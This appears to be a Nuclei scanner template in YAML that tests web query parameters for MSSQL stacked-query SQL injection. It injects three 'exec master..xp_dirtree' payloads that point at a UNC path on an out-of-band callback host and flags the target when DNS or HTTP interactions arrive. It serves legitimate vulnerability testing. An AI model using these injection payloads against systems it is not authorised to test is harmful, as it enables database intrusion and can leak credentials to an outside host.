http:
- fuzzing:
  - fuzz:
    - '{{dirtree}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    dirtree:
    - 1; exec master..xp_dirtree '\\{{interactsh-url}}\\abc'--
    - 1'; exec master..xp_dirtree '\\{{interactsh-url}}\\abc'--
    - 1" ; exec master..xp_dirtree '\\{{interactsh-url}}\\abc'--
  stop-at-first-match: true
id: ai-fuzz-xp-dirtree-oob
info:
  author: openai
  name: MSSQL xp_dirtree UNC path OOB
  severity: high
  tags: mssql,rce,sqli,oob,dast
